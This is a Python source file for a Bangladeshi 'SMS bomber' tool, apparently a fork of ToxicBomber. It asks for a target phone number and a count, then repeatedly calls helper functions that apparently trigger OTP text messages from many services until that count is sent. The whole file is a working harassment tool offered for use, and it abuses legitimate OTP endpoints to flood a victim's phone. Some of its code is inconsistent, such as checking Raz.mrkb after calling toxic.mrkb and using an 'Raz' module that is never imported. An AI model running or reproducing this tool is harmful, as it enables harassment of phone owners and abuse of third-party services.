#########################################
# Author : ALFE SANNY
# GitHub : https://github.com/ROX-TAJ/
# Coder   : Bcz Pranto Ahmed 
# Learn Everything, Teach Everyone!!
#########################################

import time
import requests
import mechanize
import sys
import os
from libs import toxic
from libs.version import *

def logopsb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def check_limit(op):
    print("\r\033[92m    [★] Massage Sent  : \033[33m[\033[37m"+str(op)+"\033[33m]\033[92m", end="")
    if(op==main.tr):
        psb("\n\n    [*] Bombing Finished Successfully..")
        psb("    [*] Sent "+str(main.tr)+" SMS To 0"+main.number+" By RazBomber\n\033[0;40;37m")
        return True
    else:
        time.sleep(4)
        return False

def inp_number():
    number = input("\033[92m\n    [*] Enter Target Number:> \033[37m").replace("+880", "")
    try:
        int(number)
    except:
        psb("\n\033[91m    [!] Wrong Number!!")
        psb("    [!] Input Number As : 01xxxxxxxxx")
        number = input("\033[92m\n    [*] Enter Target Number:> \033[37m").replace("+880", "")
    while not (len(number) == 11):
        psb("\n\033[91m    [!] Wrong Number!!")
        psb("    [!] Input Number As : 01xxxxxxxxx")
        number = input("\033[92m\n    [*] Enter Target Number:> \033[37m").replace("+880", "")
    number = number[-10:]
    return number

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

rows, column = os.popen('stty size', 'r').read().split()

def logo():
    os.system("clear")
    time.sleep(0.5)
    logopsb("\033[0;92m _____ ____                  _               \n|_   _| __ )  ___  _ __ ___ | |__   ___ _ __ \n  | | |  _ \ / _ \| '_ ` _ \| '_ \ / _ \ '__|\n  | | | |_) | (_) | | | | | | |_) |  __/ |   \n  |_| |____/ \___/|_| |_| |_|_.__/ \___|_|   \n                                             ")
    logopsb("\033[3;90m                A Product Of ToxicNoob\033[0;92m")
    time.sleep(0.6)
    logopsb("\n"+"\033[94m*"*int(column)+"\n\033[95;3m Author   \033[0;95m:\033[3;95m RazNoob\n\033[3m Tool     \033[0;95m:\033[3;95m BD SMS Bomber\n\033[3m Version  \033[0;95m:\033[3;95m 2.4\n\033[3m GitHub   \033[0;95m:\033[3;95m https://www.github.com/ROX-TAJ/\n\033[3m Coded By \033[0;95m:\033[3;95m Pranto Ahmed \n"+"\033[0;94m*"*int(column))
    time.sleep(0.8)
    
    
def main():
    number = inp_number()
    main.number = number
    tr = input("\033[92m    [*] Enter Amount (Default 10):> \033[37m")
    if(tr==""):
        tr=10
    tr = int(tr)
    main.tr = tr
    psb("\033[92m    [*] Auto Delay: 4 Seconds...")
    time.sleep(0.5)
    
    psb("\n    [!] Please wait.....")
    time.sleep(0.6)
    psb("    [!] Bombing in Progress....\n")
    time.sleep(1)
    
    op = 0
    while True:
        try:
            Raz.qzgr(number)
            if ("otp sent successful" in Raz.qzgr.res.lower()):
                op=op+1
                if (check_limit(op)):
                    break
            else:
                Raz.ghr(number)
                if (Raz.ghr.res == 200):
                    op = op+1
                    if (check_limit(op)):
                        break
                else:
                     time.sleep(4)
        except:
            time.sleep(4)
        try:
            toxic.mrkb(number)
            if (Raz.mrkb.res == 200):
                op=op+1
                if (check_limit(op)):
                    break
            else:
                Raz.ghr(number)
                if (Raz.ghr.res == 200):
                    op = op+1
                    if (check_limit(op)):
                        break
                else:
                     time.sleep(4)
        except:
            time.sleep(4)

        try:
            Raz.Bios(number)
            op=op+1
            if (check_limit(op)):
                break
        except:
            Raz.hn(number)
            if Raz.hn.res==200:
                op = op + 1
                if (check_limit(op)):
                    break
            else:
                time.sleep(4)
                 
        try:
            toxic.hn(number)
            if toxic.hn.res==200:
                op=op+1
                if (check_limit(op)):
                    break
            else:
                time.sleep(4)
        except:
            time.sleep(4)
                
        try:
            toxic.hoi(number)
            if (toxic.hoi.res==200):
                op=op+1
                if (check_limit(op)):
                    break
            else:
                Raz.hn(number)
                if toxic.hn.res==200:
                    op=op+1
                    if (check_limit(op)):
                        break
                else:
                    time.sleep(4)
        except:
            time.sleep(4)
            
        try:
            Raz.rx(number)
            if (Raz.rx.res==200):
                op=op+1
                if (check_limit(op)):
                    break
            else:
                time.sleep(4)
        except:
            time.sleep(4)

        try:
            Raz.ghr(number)
            if (Raz.ghr.res == 200):
                op = op+1
                if (check_limit(op)):
                    break
            else:
                time.sleep(4)
        except:
            time.sleep(4)

        try:
            Raz.tms(number)
            if Raz.tms.res==200:
                op=op+1
                if (check_limit(op)):
                    break
            else:
                time.sleep(4)
        except:
            time.sleep(4)

        try:
            Raz.bnbd(number)
            if Raz.bnbd.res==200:
                op=op+1
                if (check_limit(op)):
                    break
            else:
                time.sleep(4)
        except:
            time.sleep(4)

        try:
            toxic.swap(number)
            if toxic.swap.res==200:
                op=op+1
                if (check_limit(op)):
                    break
            else:
                time.sleep(4)
        except:
            time.sleep(4)

        try:
            Raz.dhk(number)
            if Raz.dhk.res==200:
                op=op+1
                if (check_limit(op)):
                    break
            else:
                time.sleep(4)
        except:
            time.sleep(4)
        
        try:
            Raz.bobd(number)
            if Raz.bobd.res==200:
                op=op+1
                if (check_limit(op)):
                    break
            else:
                Raz.swpn(number)
                if Raz.swpn.res==200:
                    op=op+1
                    if (check_limit(op)):
                        break
                else:
                    time.sleep(4)
        except:
            time.sleep(4)
            
        if(Raz.fun(number)):
                  op=op+1
                  if (check_limit(op)):
                      break
        else:
            Raz.hn(number)
            if Raz.hn.res==200:
                    op = op + 1
                    if (check_limit(op)):
                        break
            else:
                    time.sleep(4)
        
        try:
            Raz.swpn(number)
            if toxic.swpn.res==200:
                op=op+1
                if (check_limit(op)):
                    break
            else:
                time.sleep(4)
        except:
            time.sleep(4)

if __name__ == "__main__":
    version(verFile = "libs/.version", RepoURL = "https://github.com/Toxic-Noob/ToxicBomber", RepoFile = "Tbomb.py")
    logo()
    main()